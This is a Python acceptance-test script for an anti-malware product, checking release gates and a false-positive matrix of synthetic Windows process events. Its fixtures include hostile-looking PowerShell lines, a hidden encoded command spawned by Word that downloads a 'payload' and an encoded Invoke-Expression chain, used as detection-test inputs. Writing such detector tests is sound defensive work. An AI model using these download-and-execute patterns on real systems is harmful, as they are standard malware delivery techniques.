from __future__ import annotations

import argparse
import json
import tempfile
from pathlib import Path

from sentinel.advanced_antimalware import AdvancedAntimalwareEngine
from sentinel.config import APP_VERSION
from sentinel.core.events import SecurityEvent
from sentinel.database import Database
from sentinel.protection_client import ProtectionServiceClient
from sentinel.service_update import version_key
from tools.advanced_antimalware_acceptance import run as run_beta3
from tools.antispyware_acceptance import run as run_beta1
from tools.antispyware_remediation_acceptance import run as run_beta2
from tools.release_candidate_acceptance import run as run_v080_rc1

ROOT = Path(__file__).resolve().parents[1]
REQUIRED_DOCS = (
    "README.md",
    "ROADMAP.md",
    "DEVELOPMENT_STATUS.md",
    "RELEASE-NOTES-v0.9.0-rc.1.md",
    "BC_SENTINEL_V090_RC1_CONSOLIDATION_REPORT.md",
    "BC_Sentinel_Roadmap_v0_9_0_RC1_Updated.md",
)


def _proc(
    name: str,
    cmd: str,
    *,
    pid: int,
    parent: str = "explorer.exe",
    signature_status: str = "",
    signer: str = "",
    path: str | None = None,
    data: dict | None = None,
) -> SecurityEvent:
    payload = {
        "cmdline": cmd,
        "parent_name": parent,
        "harmless_fixture": True,
    }
    if signature_status:
        payload["signature_status"] = signature_status
    if signer:
        payload["signer"] = signer
    payload.update(data or {})
    return SecurityEvent(
        category="process",
        action="start",
        source="v090rc1-acceptance",
        pid=pid,
        ppid=max(1, pid - 1),
        process_name=name,
        process_path=path or fr"C:\Windows\System32\{name}",
        data=payload,
    )


def _false_positive_matrix() -> dict:
    with tempfile.TemporaryDirectory(prefix="bcs-v090rc1-fp-") as tmp:
        engine = AdvancedAntimalwareEngine(Database(Path(tmp) / "sentinel.sqlite"))
        cases = {
            "powershell_write_output": engine.assess_event(_proc(
                "powershell.exe",
                "powershell.exe -NoProfile -Command Write-Output BCS090RC1_SAFE",
                pid=7101,
            )),
            "signed_certutil_hash": engine.assess_event(_proc(
                "certutil.exe",
                "certutil.exe -hashfile C:\\Windows\\System32\\notepad.exe SHA256",
                pid=7102,
                signature_status="valid",
                signer="Microsoft Windows",
            )),
            "signed_msiexec_remote_package": engine.assess_event(_proc(
                "msiexec.exe",
                "msiexec.exe /i https://example.invalid/enterprise-package.msi /qn",
                pid=7103,
                signature_status="valid",
                signer="Microsoft Windows",
            )),
            "browser_to_powershell_no_profile": engine.assess_event(_proc(
                "powershell.exe",
                "powershell.exe -NoProfile -Command Get-Date",
                pid=7104,
                parent="msedge.exe",
            )),
            "office_to_powershell_download_only": engine.assess_event(_proc(
                "powershell.exe",
                "powershell.exe -NoProfile -Command Invoke-WebRequest https://example.invalid/status.txt",
                pid=7105,
                parent="winword.exe",
            )),
            "bitsadmin_transfer_only": engine.assess_event(_proc(
                "bitsadmin.exe",
                "bitsadmin.exe /transfer BCSJob https://example.invalid/file.txt C:\\Temp\\file.txt",
                pid=7106,
            )),
        }

        strong = engine.assess_event(_proc(
            "powershell.exe",
            "powershell.exe -WindowStyle Hidden -EncodedCommand QUJDRA== Invoke-WebRequest https://fixture.invalid/payload",
            pid=7190,
            parent="winword.exe",
        ))
        deterministic = engine.assess_event(_proc(
            "powershell.exe",
            "powershell.exe -EncodedCommand QUJDRA== Invoke-Expression ([Convert]::FromBase64String('QQ=='))",
            pid=7191,
            data={"qualified_file_verdict": True},
        ))

    serialized = {
        name: {
            "score": result.score,
            "level": result.level,
            "qualified_high": result.qualified_high,
            "automatic_destructive_action": result.automatic_destructive_action,
            "evidence_families": result.evidence_families,
        }
        for name, result in cases.items()
    }
    all_below_high = all(item["score"] < 70 and item["qualified_high"] is False for item in serialized.values())
    routine_safe = all(
        serialized[name]["score"] < 25
        for name in (
            "powershell_write_output",
            "signed_certutil_hash",
            "signed_msiexec_remote_package",
            "browser_to_powershell_no_profile",
            "bitsadmin_transfer_only",
        )
    )
    strong_detection_retained = bool(
        strong.score >= 70
        and strong.qualified_high
        and deterministic.score >= 85
        and deterministic.qualified_high
        and not strong.automatic_destructive_action
        and not deterministic.automatic_destructive_action
    )
    return {
        "cases": serialized,
        "all_benign_cases_below_high": all_below_high,
        "routine_admin_cases_safe": routine_safe,
        "strong_detection_retained": strong_detection_retained,
        "strong_chain": {
            "score": strong.score,
            "level": strong.level,
            "qualified_high": strong.qualified_high,
        },
        "deterministic_chain": {
            "score": deterministic.score,
            "level": deterministic.level,
            "qualified_high": deterministic.qualified_high,
        },
    }


def run(*, service_live: bool = False) -> dict:
    v080 = run_v080_rc1(service_live=False)
    beta1 = run_beta1(service_live=False)
    beta2 = run_beta2(service_live=False)
    beta3 = run_beta3(service_live=False)
    fp = _false_positive_matrix()

    docs_missing = [name for name in REQUIRED_DOCS if not (ROOT / name).is_file()]
    version_order_ok = version_key("0.9.0-beta.3") < version_key("0.9.0-rc.1") < version_key("0.9.0")
    current_supports_rc1 = version_key(APP_VERSION) >= version_key("0.9.0-rc.1")

    result = {
        "product": "BC Sentinel",
        "version": APP_VERSION,
        "release_candidate": "0.9.0-rc.1",
        "service_live_requested": bool(service_live),
        "consolidation": {
            "current_version_is_rc1": APP_VERSION == "0.9.0-rc.1",
            "current_version_supports_rc1_baseline": current_supports_rc1,
            "version_order": "0.9.0-beta.3 < 0.9.0-rc.1 < 0.9.0",
            "version_order_valid": version_order_ok,
            "required_docs_present": not docs_missing,
            "missing_docs": docs_missing,
        },
        "regression_gates": {
            "v080_rc1_frozen_baseline": bool(v080.get("passed")),
            "v090_beta1_antispyware": bool(beta1.get("passed")),
            "v090_beta2_reversible_remediation": bool(beta2.get("passed")),
            "v090_beta3_advanced_antimalware": bool(beta3.get("passed")),
        },
        "false_positive_hardening": fp,
        "release_policy": {
            "single_dual_use_tool_is_malware": False,
            "single_evidence_high_allowed": False,
            "automatic_process_termination": False,
            "automatic_file_delete": False,
            "automatic_quarantine": False,
            "automatic_persistence_remediation": False,
            "native_windows_acceptance_required_before_freeze": True,
            "service_live_acceptance_required_before_freeze": True,
        },
    }

    local_ok = bool(
        current_supports_rc1
        and version_order_ok
        and not docs_missing
        and all(result["regression_gates"].values())
        and fp["all_benign_cases_below_high"]
        and fp["routine_admin_cases_safe"]
        and fp["strong_detection_retained"]
    )
    result["local_foundation_passed"] = local_ok

    service_live_passed = None
    service_summary = None
    if service_live:
        live_beta1 = run_beta1(service_live=True)
        live_beta2 = run_beta2(service_live=True)
        live_beta3 = run_beta3(service_live=True)
        client = ProtectionServiceClient(timeout=3.0)
        status = client.status() or {}
        advanced = client.advanced_antimalware_status() or {}
        service_live_passed = bool(
            live_beta1.get("passed")
            and live_beta2.get("passed")
            and live_beta3.get("passed")
            and status.get("health") in {"HEALTHY", "DEGRADED"}
            and advanced.get("mode") == "advisory_multi_signal"
            and advanced.get("single_dual_use_tool_is_malware") is False
            and advanced.get("single_evidence_high_allowed") is False
            and advanced.get("automatic_process_termination") is False
            and advanced.get("automatic_file_delete") is False
            and advanced.get("automatic_quarantine") is False
            and advanced.get("automatic_destructive_action") is False
        )
        service_summary = {
            "health": status.get("health"),
            "transport": status.get("transport"),
            "advanced_antimalware_mode": advanced.get("mode"),
            "beta1_live": bool(live_beta1.get("passed")),
            "beta2_live": bool(live_beta2.get("passed")),
            "beta3_live": bool(live_beta3.get("passed")),
            "automatic_destructive_action": advanced.get("automatic_destructive_action"),
        }

    result["service"] = service_summary
    result["service_live_passed"] = service_live_passed
    result["passed"] = bool(local_ok and (not service_live or service_live_passed))
    return result


def main() -> int:
    parser = argparse.ArgumentParser(description="BC Sentinel v0.9.0-rc.1 consolidation and false-positive hardening acceptance")
    parser.add_argument("--service-live", action="store_true")
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()
    result = run(service_live=bool(args.service_live))
    text = json.dumps(result, ensure_ascii=False, indent=2)
    print(text)
    if args.output:
        args.output.write_text(text + "\n", encoding="utf-8")
    return 0 if result.get("passed") else 2


if __name__ == "__main__":
    raise SystemExit(main())
